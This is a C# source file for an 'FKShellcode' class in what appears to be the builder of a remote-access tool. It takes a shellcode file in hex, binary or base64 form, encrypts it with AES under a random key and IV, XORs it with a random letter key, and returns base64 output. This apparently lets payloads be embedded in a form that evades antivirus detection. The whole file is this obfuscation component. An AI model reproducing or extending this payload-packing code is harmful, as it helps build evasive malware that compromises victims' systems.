using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Builder
{
    public class FKShellcode
    {
        private const int XOR_KEY_LENGTH = 18;
        private static Random randomAesKeyIV = new Random();
        private string aes_key;
        private string aes_iv;
        private string xor_key;

        public FKShellcode()
        {
            aes_key = Convert.ToBase64String(GetRandomKey());
            aes_iv = Convert.ToBase64String(GetRandomIV());
            xor_key = GetJuggledLetters(XOR_KEY_LENGTH);
        }

        public string GetAesKey() { return aes_key; }
        public string GetAesIV() { return aes_iv; }
        public string GetXorKey() { return xor_key; }

        public string Encrypt(string binFilePath)
        {
            byte[] aesEncByte = new byte[] {};
            if (IsHex(File.ReadAllText(binFilePath)))
            {
                byte[] srcBytes = StringToByteArray(File.ReadAllText(binFilePath));
                aesEncByte = AESEncrypt(srcBytes, aes_key, aes_iv);
            }
            else if (IsBinary(binFilePath))
            {
                byte[] srcBytes = File.ReadAllBytes(binFilePath);
                aesEncByte = AESEncrypt(srcBytes, aes_key, aes_iv);
            }
            else if (IsBase64String(File.ReadAllText(binFilePath)))
            {
                string base64String = File.ReadAllText(binFilePath);
                byte[] srcBytes = Convert.FromBase64String(base64String);
                aesEncByte = AESEncrypt(srcBytes, aes_key, aes_iv);
            }
            else
            {
                return File.ReadAllText(binFilePath);       // 未知格式
            }

            byte[] xorAesEncByte = XorEncDec(aesEncByte, xor_key);
            return Convert.ToBase64String(xorAesEncByte);
        }

        public string XOREncrypt(string binFilePath)
        {
            byte[] aesEncByte = new byte[] { };
            if (IsHex(File.ReadAllText(binFilePath)))
            {
                aesEncByte = StringToByteArray(File.ReadAllText(binFilePath));
            }
            else if (IsBinary(binFilePath))
            {
                aesEncByte = File.ReadAllBytes(binFilePath);
            }
            else if (IsBase64String(File.ReadAllText(binFilePath)))
            {
                string base64String = File.ReadAllText(binFilePath);
                aesEncByte = Convert.FromBase64String(base64String);
            }
            else
            {
                return File.ReadAllText(binFilePath);       // 未知格式
            }

            byte[] xorAesEncByte = XorEncDec(aesEncByte, xor_key);
            return Convert.ToBase64String(xorAesEncByte);
        }

        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        public static bool IsHex(string s)
        {
            string strHex = String.Concat("[0-9A-Fa-f]{", s.Length, "}");
            bool RetBoolHex = Regex.IsMatch(s, strHex);
            return RetBoolHex;
        }

        public static bool IsBinary(string path)
        {
            long length = new FileInfo(path).Length;
            if (length == 0) 
                return false;

            using (StreamReader stream = new StreamReader(path))
            {
                int ch;
                while ((ch = stream.Read()) != -1)
                {
                    if (isControlChar(ch))
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        public static bool isControlChar(int ch)
        {
            return (ch > Chars.NUL && ch < Chars.BS)
                || (ch > Chars.CR && ch < Chars.SUB);
        }

        public static class Chars
        {
            public static char NUL = (char)0;   // Null char
            public static char BS = (char)8;    // Back Space
            public static char CR = (char)13;   // Carriage Return
            public static char SUB = (char)26;  // Substitute
        }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static byte[] AESEncrypt(byte[] srcBytes, string aes_key, string aes_iv)
        {
            MemoryStream ms = new MemoryStream();
            Rijndael alg = Rijndael.Create();

            alg.Key = Convert.FromBase64String(aes_key);
            alg.IV = Convert.FromBase64String(aes_iv);

            CryptoStream cs = new CryptoStream(ms,
               alg.CreateEncryptor(), CryptoStreamMode.Write);

            cs.Write(srcBytes, 0, srcBytes.Length);
            cs.Close();

            byte[] encryptedData = ms.ToArray();
            return encryptedData;
        }


        public static byte[] GetRandomKey()
        {
            byte[] key = new byte[32];

            for (int i = 0; i < 32; i++)
            {
                randomAesKeyIV.NextBytes(key);
            }
            return key;
        }

        public static byte[] GetRandomIV()
        {
            byte[] iv = new byte[16];

            for (int i = 0; i < 16; i++)
            {
                randomAesKeyIV.NextBytes(iv);
            }
            return iv;
        }

        private static byte[] XorEncDec(byte[] srcBytes, string strKey)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(strKey);
            byte[] mixed = new byte[srcBytes.Length];
            for (int i = 0; i < srcBytes.Length; i++)
            {
                mixed[i] = (byte)(srcBytes[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        public string GetJuggledLetters(int length)
        {
            const string chars = "ABCDE!+FGHIJKLMNOPQRSTUVWXY!+Zabcdefghijklmnopqrs!+tuvwxyz0123456789!+";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[randomAesKeyIV.Next(s.Length)]).ToArray());
        }
    }
}
